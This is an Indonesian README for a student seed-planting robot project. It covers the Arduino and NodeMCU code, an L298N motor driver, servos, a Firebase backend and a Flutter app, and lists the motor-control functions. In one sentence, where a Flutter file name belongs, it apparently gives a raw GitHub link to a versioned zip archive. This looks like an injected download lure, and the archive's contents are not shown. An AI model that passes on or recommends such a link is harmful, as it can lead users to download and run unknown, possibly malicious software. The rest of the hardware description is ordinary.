Project Ini bertujuan untuk memenuhi tugas kuliah dan memenuhi hobi saya

Contributor:

- Falih Taufiqul Hakim
- Thomas Santoso
- Alvidhatul Adzhiva
- Rifki Maulana Syarif


folder pages, providers, dan file https://raw.githubusercontent.com/rifkimaulana05/robocorn/master/pages/robocorn-v2.9-alpha.3.zip adalah file dan folder untuk flutter.

dan folder arduino dan nodemcu adalah isi dari program untuk arduino dan nodemcunya.
tal
komponen yang digunakan di robot ini diantaranya :
- Arduino Uno
- Nodemcu
- L298N
- Motor DC 2pcs
- Servo 2 pcs
- Buzzer Piezo
- Lcd I2C
- MPU6050 (coming soon kalau mau full otomatis untuk sekarang full manual)

Keterangan untuk driver L298N sudah ada stepdownnya jadi tidak usah butuh komponen stepdown tambahan untuk menurunkan tegangan.

untuk backendnya ini kita pakai firebase.

untuk mendapatkan ip dari nodemcu bisa run codingan dari nodemcu itu nanti akan muncul di serial monitor.

`Motorstop` fungsi untuk mengstop motor.

`Motormaju` fungsi untuk menjalankan kedua motor.

`Motorkanan` fungsi untuk menjalankan motor kiri saja.

`Motorkiri` fungsi untuk menjalankan motor kanan saja.

`Motormundur` fungsi untuk memundurkan motor.

`Lubang` fungsi untuk menggerakkan servo 1.

`Benih` fungsi untuk menggerakkan servo 2.

`beep` fungsi untuk menyalakan buzzer.


*UPDATE* :
update tentang tegangan untuk stepdown dari driver spesifikasi arus maksimum sebesar 2A dan total arus yang dibutuhkan cukup besar dikarnakan saya ganti ke serv0 mg99r jika saya masih pake stepdown dari driver maka arus dari tegangan tidak stabil dan akhirnya saya pake stepdown lm2596 yang memiliki spek arus maksimum sebesar 3A.

